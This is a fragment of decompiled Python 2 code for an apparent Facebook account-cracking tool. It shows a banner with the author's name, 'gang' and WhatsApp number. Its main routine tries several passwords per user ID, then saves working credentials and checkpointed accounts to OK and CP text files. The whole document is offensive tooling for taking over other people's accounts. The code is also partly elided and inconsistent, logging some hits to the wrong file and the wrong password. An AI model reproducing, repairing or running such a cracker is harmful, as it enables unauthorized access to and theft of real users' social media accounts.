# Decompiled By AMIR MOBILE
# Github : https://github.com/AMIRKHAN11
# uncompyle6 version 3.7.4
# Original written By AMIR KHAN
...
logo = """
 ...
 \x1b[1;96m  ; |  ; |  | |  | |  | |  | |   | |        
 \x1b[1;96m  ' `-'  |  | |  | |  | |  | |   | |        
 \x1b[1;96m  \`.__.'_. (___)(___)(___)(___) (___)                                          
                                                                                                                                                                      
\x1b[1;96m_________________________________________________
\x1b[1;96m\033[1;96mAuthor   :          AMIR_KHAN(MARDANY)
\x1b[1;96m\033[1;96mGANG:              AMIR & AWAIS 
\x1b[1;96m\033[1;96mWATSAPP:          +92 344 9376837
\x1b[1;96m\033[1;96mVersion  :          CODING BASE 2.2
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;96m  [AMIR_Temp_Lock]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m  [AMIR_CP] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [AMIR_OK] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m  [AMIR_CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [AMIR_OK]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [AMIR_CP] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/CP.txt', 'a')
                       ...
                       q = json.load(data)
                       if 'access_token' in q:
                        print '\x1b[1;96m  [AMIR_OK]  ' + k + c + user + '  |  ' + pass4
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass4 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                       elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [AMIR_CP] ' + k + c + user + '  |  ' + pass4
                        cps = open('save/CP.txt', 'a')
